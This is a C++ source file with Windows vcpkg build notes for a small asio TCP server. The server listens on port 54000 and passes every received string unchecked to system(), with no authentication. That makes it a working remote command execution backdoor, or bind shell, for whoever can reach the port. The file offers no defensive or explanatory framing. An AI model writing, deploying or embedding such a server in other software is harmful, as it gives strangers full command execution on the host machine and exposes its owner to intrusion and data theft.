#include <iostream>
#include <string>
#include <thread>
#include <vector>
#include <asio.hpp>

// BUILD INSTRUCTIONS:
// For boost.asio, you need to install the Boost library.
//   Install vcpkg:
//     git clone https://github.com/microsoft/vcpkg.git C:\vcpkg
//     cd C:\vcpkg
//     bootstrap-vcpkg.bat
//     vcpkg integrate install
//   Install Boost.Asio:
//     vcpkg install asio
// In Windows settings add the following environment variable:
//   MY_VCPKG_ROOT=C:\vcpkg
// 
//  $(MY_VCPKG_ROOT)\installed\x64-windows\include

using asio::ip::tcp;

void handle_client(tcp::socket socket) {
    try {
        std::vector<char> buffer(1024);
        asio::error_code error;
        size_t length = socket.read_some(asio::buffer(buffer), error);

        if (error == asio::error::eof) {
            std::cout << "Connection closed by client" << std::endl;
        }
        else if (error) {
            throw asio::system_error(error);
        }

        std::string command(buffer.data(), length);
        std::cout << "Received command: " << command << std::endl;

        // Execute the command
        system(command.c_str());
    }
    catch (std::exception& e) {
        std::cerr << "Exception in thread: " << e.what() << std::endl;
    }
}

int main() {
    try {
        asio::io_context io_context;
        tcp::acceptor acceptor(io_context, tcp::endpoint(tcp::v4(), 54000));

        std::cout << "Server is listening on port 54000..." << std::endl;

        while (true) {
            tcp::socket socket(io_context);
            acceptor.accept(socket);
            std::thread(handle_client, std::move(socket)).detach();
        }
    }
    catch (std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
    }

    return 0;
}
